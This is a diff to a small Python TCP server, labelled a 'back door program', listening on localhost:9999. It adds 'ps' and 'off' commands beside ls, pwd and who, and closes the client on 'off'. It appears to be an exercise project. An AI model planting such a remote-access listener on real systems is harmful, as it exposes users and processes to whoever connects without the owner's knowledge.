@@ -22,7 +22,13 @@ def hlp_com():
             +"off - terminates the back door program\n")
 
 def who_com():
-    return(subprocess.check_output(["/bin/who"]))
+    return(subprocess.check_output(["/bin/who"]).decode("utf-8"))
+
+def ps_com():
+    return (subprocess.check_output(["/bin/ps"]).decode("utf-8"))
+
+def off_com():
+    return ("client disconnect")
 
 class MyTCPHandler(socketserver.BaseRequestHandler):
    BUFFER_SIZE = 4096
@@ -42,14 +48,21 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
            option = {'ls\n': ls_com,
                      'pwd\n': pwd_com,
                      'help\n': hlp_com,
-                     'who\n':who_com}
+                     'who\n':who_com,
+                     'ps\n':ps_com,
+                     'off\n':off_com}
 
            response = option[data]()
+
 
 
            self.request.sendall(bytearray(response,"UTF-8"))
            print("%s (%s) wrote: %s" % (self.client_address[0],
                  threading.currentThread().getName(), data.strip()))
+           if(response=="client disconnect"):
+               self.request.close()
+               break
+
 
 if __name__ == "__main__":
    HOST, PORT = "localhost", 9999
